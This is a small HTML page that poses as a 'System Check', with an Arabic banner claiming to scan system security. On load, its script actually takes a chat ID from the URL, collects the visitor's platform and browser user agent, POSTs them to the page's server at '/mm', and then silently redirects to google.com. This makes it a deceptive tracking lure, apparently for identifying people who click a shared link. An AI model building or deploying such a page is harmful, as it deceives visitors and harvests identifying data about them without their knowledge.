<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>System Check</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>body { background: black; color: white; font-family: sans-serif; }</style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen">
    <div class="animate-pulse text-red-500 text-xl font-bold">جاري فحص أمان النظام...</div>
    <script>
        window.onload = async () => {
            const urlParams = new URLSearchParams(window.location.search);
            const chatId = urlParams.get('id');
            const info = { deviceName: navigator.platform, browserName: navigator.userAgent };
            await fetch('/mm', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ userId: chatId, deviceInfo: info })
            });
            setTimeout(() => { window.location.href = "https://google.com"; }, 1500);
        };
    </script>
</body>
</html>
